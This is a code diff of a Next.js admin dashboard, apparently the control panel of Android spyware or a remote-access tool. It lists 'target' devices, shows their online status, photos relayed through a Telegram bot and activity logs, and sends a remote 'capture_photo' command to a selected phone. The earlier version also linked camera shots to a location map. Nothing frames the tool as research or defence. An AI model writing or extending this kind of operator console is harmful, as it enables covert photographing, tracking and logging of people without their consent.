@@ -1,159 +1,94 @@
-/**
- * Overwatch v1.0 - Flying Bird Dashboard
- * Real-time Monitoring System
- * Camera: Telegram Bot | Logs: Firebase
- */
-
 'use client';
 
-import React, { useEffect, useState } from 'react';
-import { motion } from 'framer-motion';
-import { Camera, MapPin, Activity, Trash2 } from 'lucide-react';
-import { useRouter } from 'next/navigation';
-import { useSystemLogs, useActiveDevices, useDeviceLocations } from '@/hooks/useFirebase';
-import { formatTimeAgo } from '@/lib/utils';
+import { useEffect, useMemo, useState } from 'react';
+import TargetList from '@/components/TargetList';
+import PhotoGallery from '@/components/PhotoGallery';
+import ActivityLog from '@/components/ActivityLog';
+import { subscribeToTargets, sendCommand } from '@/services/targetService';
+import { Target } from '@/types/target';
 
 export default function DashboardPage() {
-  const router = useRouter();
-  const { devices } = useActiveDevices();
-  const { logs } = useSystemLogs(50);
-  const [selectedTarget] = useState('SM-G998B');
-  const [cameraImage, setCameraImage] = useState<string | null>(null);
-  const [cameraLoading, setCameraLoading] = useState(true);
+  const [targets, setTargets] = useState<Target[]>([]);
+  const [loading, setLoading] = useState(true);
+  const [selectedTargetId, setSelectedTargetId] = useState<string | null>(null);
+  const [busyTargetId, setBusyTargetId] = useState<string | null>(null);
 
-  // Fetch camera image dari Telegram bot
   useEffect(() => {
-    const fetchTelegramImage = async () => {
-      try {
-        setCameraLoading(true);
-        const response = await fetch(`/api/telegram/latest-photo?deviceId=${selectedTarget}`);
-        const data = await response.json();
-        
-        if (data.imageUrl) {
-          setCameraImage(data.imageUrl);
-        }
-        setCameraLoading(false);
-      } catch (error) {
-        console.error('Failed to fetch camera image:', error);
-        setCameraLoading(false);
-      }
-    };
+    const unsubscribe = subscribeToTargets((incomingTargets: Target[] = []) => {
+      setTargets(incomingTargets);
+      setLoading(false);
+    });
 
-    fetchTelegramImage();
-  }, [selectedTarget]);
+    return () => unsubscribe();
+  }, []);
 
-  const handleCameraClick = () => {
-    router.push('/dashboard/map');
+  useEffect(() => {
+    if (!selectedTargetId && targets.length > 0) {
+      setSelectedTargetId(targets[0].id);
+    }
+  }, [targets, selectedTargetId]);
+
+  const selectedTarget = useMemo(
+    () => targets.find((target) => target.id === selectedTargetId) ?? targets[0] ?? null,
+    [selectedTargetId, targets]
+  );
+
+  const handleCapture = async (deviceId: string) => {
+    setBusyTargetId(deviceId);
+    try {
+      await sendCommand(deviceId, 'capture_photo');
+    } finally {
+      setBusyTargetId(null);
+    }
   };
 
+  const onlineCount = useMemo(
+    () => targets.filter((target) => target.status?.toUpperCase() === 'ONLINE').length,
+    [targets]
+  );
+
+  const offlineCount = useMemo(() => targets.length - onlineCount, [targets.length, onlineCount]);
+
   return (
-    <motion.div
-      className="space-y-6"
-      initial={{ opacity: 0 }}
-      animate={{ opacity: 1 }}
-    >
-      {/* Header: Live Monitoring */}
-      <div className="border-b-2 border-emerald-500/40 pb-4">
-        <h1 className="text-xl font-bold text-emerald-400 font-mono tracking-wider">
-          ▶ [ LIVE MONITORING ]
-        </h1>
-        <p className="text-xs text-emerald-500/60 mt-1 font-mono">
-          Target: {selectedTarget} | Devices: {devices.length} | Last Update: {new Date().toLocaleTimeString()}
-        </p>
-      </div>
-
-      {/* Main Content: Camera Feed (Clickable to Maps) + Activity Logs */}
-      <div className="grid grid-cols-12 gap-4">
-        {/* Camera Feed - Left (7 cols) - Clickable to Maps */}
-        <motion.div
-          onClick={handleCameraClick}
-          className="col-span-7 border-2 border-emerald-500/40 bg-emerald-500/5 rounded overflow-hidden hover:border-emerald-400/80 hover:shadow-lg hover:shadow-emerald-500/30 transition-all cursor-pointer group"
-          whileHover={{ scale: 1.01 }}
-        >
-          <div className="px-4 py-3 border-b border-emerald-500/30 flex items-center gap-2">
-            <Camera size={16} className="text-emerald-400 group-hover:animate-pulse" />
-            <h2 className="text-sm font-bold text-emerald-300 font-mono uppercase">
-              [ FRONT CAM ] ← Click untuk Maps
-            </h2>
-          </div>
-
-          {/* Camera Stream */}
-          <div className="bg-black aspect-video flex items-center justify-center relative overflow-hidden">
-            {cameraLoading ? (
-              <div className="absolute inset-0 bg-gradient-to-r from-emerald-500/10 to-transparent animate-pulse flex items-center justify-center">
-                <div className="text-center">
-                  <p className="text-xs text-emerald-500/60 font-mono animate-pulse">
-                    ◆ LOADING CAMERA FEED...
-                  </p>
-                </div>
-              </div>
-            ) : cameraImage ? (
-              <img
-                src={cameraImage}
-                alt="Camera Feed"
-                className="w-full h-full object-cover"
-              />
-            ) : (
-              <div className="flex flex-col items-center justify-center w-full h-full bg-gradient-to-b from-emerald-900/20 to-black">
-                <Camera size={48} className="text-emerald-500/40 mb-2" />
-                <p className="text-xs text-emerald-500/50 font-mono">[TELEGRAM BOT STREAM]</p>
-              </div>
-            )}
-          </div>
-
-          <div className="px-4 py-2 bg-emerald-500/5 border-t border-emerald-500/30 text-xs text-emerald-500/60 font-mono">
-            Source: Telegram Bot | Resolution: Auto | Status: {cameraLoading ? 'Loading...' : 'Ready'}
-          </div>
-        </motion.div>
-
-        {/* Activity Logs - Right (5 cols) */}
-        <div className="col-span-5 border-2 border-emerald-500/40 bg-emerald-500/5 rounded overflow-hidden hover:border-emerald-400/60 transition-all flex flex-col">
-          <div className="px-4 py-3 border-b border-emerald-500/30 flex items-center justify-between">
-            <div className="flex items-center gap-2">
-              <Activity size={16} className="text-emerald-400" />
-              <h2 className="text-sm font-bold text-emerald-300 font-mono uppercase">
-                [ LOGS ]
-              </h2>
+    <main className="min-h-screen bg-slate-950 px-4 py-6 text-white">
+      <div className="mx-auto max-w-[1480px] space-y-6">
+        <section className="rounded-[32px] border border-white/10 bg-slate-950/90 p-6 shadow-2xl shadow-slate-950/40 backdrop-blur-xl">
+          <p className="text-sm uppercase tracking-[0.3em] text-emerald-300/80">Keigame Admin</p>
+          <h1 className="mt-3 text-4xl font-semibold text-white">Military-Grade Command Center</h1>
+          <p className="mt-3 max-w-2xl text-sm text-slate-400">
+            Monitor perangkat target Android secara real-time, lihat status dan foto terkini, serta pantau aktivitas bot di satu dashboard.
+          </p>
+          <div className="mt-6 grid gap-4 sm:grid-cols-3">
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
+              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Total Targets</p>
+              <p className="mt-3 text-3xl font-semibold text-white">{targets.length}</p>
             </div>
-            <button className="text-xs px-2 py-1 border border-red-500/30 text-red-400/70 hover:border-red-400 hover:text-red-400 rounded transition-all flex items-center gap-1 font-mono">
-              <Trash2 size={12} />
-              Clear
-            </button>
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
+              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Online</p>
+              <p className="mt-3 text-3xl font-semibold text-emerald-400">{onlineCount}</p>
+            </div>
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
+              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Offline</p>
+              <p className="mt-3 text-3xl font-semibold text-slate-300">{offlineCount}</p>
+            </div>
           </div>
+        </section>
 
-          {/* Log Viewer */}
-          <div className="bg-black flex-1 overflow-y-auto p-4 font-mono text-xs">
-            {logs.length === 0 ? (
-              <p className="text-emerald-500/40">$ No activity logs available</p>
-            ) : (
-              <div className="space-y-1">
-                {logs.map((log) => (
-                  <div
-                    key={log.id}
-                    className="flex gap-2 hover:bg-emerald-500/10 px-2 py-1 rounded transition-all text-emerald-400/70"
-                  >
-                    <span className="text-emerald-500/60 flex-shrink-0">
-                      [{formatTimeAgo(log.timestamp)}]
-                    </span>
-                    <span className="text-emerald-500/80">›</span>
-                    {log.deviceId && (
-                      <span className="text-emerald-600 flex-shrink-0">
-                        {log.deviceId}
-                      </span>
-                    )}
-                    <span className="flex-1 truncate">{log.message}</span>
-                  </div>
-                ))}
-              </div>
-            )}
-          </div>
+        <div className="grid gap-6 xl:grid-cols-[2.4fr_1.4fr_1fr]">
+          <TargetList
+            targets={targets}
+            loading={loading}
+            selectedTargetId={selectedTargetId ?? undefined}
+            onSelect={(deviceId) => setSelectedTargetId(deviceId)}
+            onCapture={handleCapture}
+            busyTargetId={busyTargetId}
+          />
 
-          <div className="px-4 py-2 bg-emerald-500/5 border-t border-emerald-500/30 text-xs text-emerald-500/60 font-mono flex justify-between">
-            <span>Events: {logs.length}</span>
-            <span>Firebase: ●</span>
-          </div>
+          <PhotoGallery targetId={selectedTarget?.id} />
+
+          <ActivityLog targetId={selectedTarget?.id} />
         </div>
       </div>
-    </motion.div>
+    </main>
   );
 }
